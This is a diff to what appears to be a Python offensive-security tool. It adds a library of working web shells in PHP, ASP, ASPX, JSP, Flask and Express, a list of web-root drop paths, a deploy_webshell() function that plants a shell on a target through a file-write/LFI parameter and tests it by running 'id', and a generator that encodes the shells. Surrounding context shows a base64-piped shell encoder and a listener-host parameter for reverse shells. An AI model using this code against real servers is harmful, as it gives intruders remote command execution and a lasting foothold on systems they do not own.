@@ -1,5 +1,7 @@
-import json, base64
-from typing import Dict, List, Optional
+import base64
+from typing import Dict, Optional
+
+import requests
 
 from tools.log_utils import get_logger
 
@@ -69,6 +71,73 @@ ENCODERS = {
     "b64_sh": lambda s: 'sh -c "echo %s | base64 -d | sh"' % base64.b64encode(s.encode()).decode().rstrip("="),
     "ps_b64": lambda s: "powershell_amsi_bypass (requires manual encoding)",
 }
+
+
+WEBSHELLS = {
+    "php_cmd": "<?php system($_GET['c']); ?>",
+    "php_exec": "<?php echo shell_exec($_GET['cmd']); ?>",
+    "php_b64": "<?php eval(base64_decode($_POST['c'])); ?>",
+    "asp_cmd": '<% Dim c : c = Request.QueryString("c") : Execute(c) %>',
+    "aspx_cmd": '<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start(Request["cmd"]).StandardOutput.ReadToEnd()) %>',
+    "jsp_cmd": '<%@page import="java.io.*"%><% Process p = Runtime.getRuntime().exec(request.getParameter("c"));BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null){out.println(l);}%>',
+    "python_flask": 'import os,sys,flask;app=flask.Flask(__name__);@app.route("/<cmd>") def x(cmd):return os.popen(cmd).read();app.run(host="0.0.0.0",port=8888)',
+    "node_express": 'require("child_process").exec(require("express")().get("/:c",(q,r)=>r.end(require("child_process").execSync(q.params.c).toString())).listen(8888)',
+}
+
+WEBSHELL_PATHS = [
+    "/var/www/html/shell.php",
+    "/var/www/shell.php",
+    "/usr/share/nginx/html/shell.php",
+    "C:/inetpub/wwwroot/shell.asp",
+    "C:/xampp/htdocs/shell.php",
+    "/opt/lampp/htdocs/shell.php",
+    "/home/www/shell.php",
+    "/tmp/shell.php",
+]
+
+
+def deploy_webshell(target_url: str, webshell_type: str = "php_cmd",
+                    path: str = "", sess: Optional[requests.Session] = None,
+                    timeout: float = 10.0) -> Dict:
+    result = {"success": False, "webshell_url": None, "type": webshell_type, "error": None}
+    code = WEBSHELLS.get(webshell_type)
+    if not code:
+        result["error"] = "Unknown webshell type: %s" % webshell_type
+        return result
+    if not path:
+        path = WEBSHELL_PATHS[0]
+    file_param = "file"
+    content_param = "content"
+    import urllib.parse
+    deploy_methods = [
+        ("lfi_write", "%s&%s=%s&%s=%s" % (target_url, file_param, path, content_param, urllib.parse.quote(code))),
+    ]
+    if sess is None:
+        sess = requests.Session()
+    try:
+        r = sess.get(deploy_methods[0][1], timeout=timeout)
+        shell_url = target_url.rstrip("/?&") + "/shell.php"
+        r2 = sess.get(shell_url + "?c=id", timeout=timeout)
+        if r2.status_code == 200 and ("uid=" in r2.text or "root" in r2.text.lower()):
+            result["success"] = True
+            result["webshell_url"] = shell_url
+            result["output"] = r2.text[:200]
+            return result
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
+def generate_webshell(webshell_type: str = "php_cmd", encode: str = "raw") -> Dict:
+    code = WEBSHELLS.get(webshell_type, WEBSHELLS["php_cmd"])
+    result = {"type": webshell_type, "code": code, "paths": WEBSHELL_PATHS[:5]}
+    if encode == "b64":
+        result["encoded"] = base64.b64encode(code.encode()).decode()
+    elif encode == "url":
+        import urllib.parse
+        result["encoded"] = urllib.parse.quote(code)
+    result["disclaimer"] = "Use deploy_webshell() for automated delivery via LFI/RCE"
+    return result
 
 
 def run(lhost: str = "LHOST", lport: int = 4444, encode: str = "raw") -> Dict:
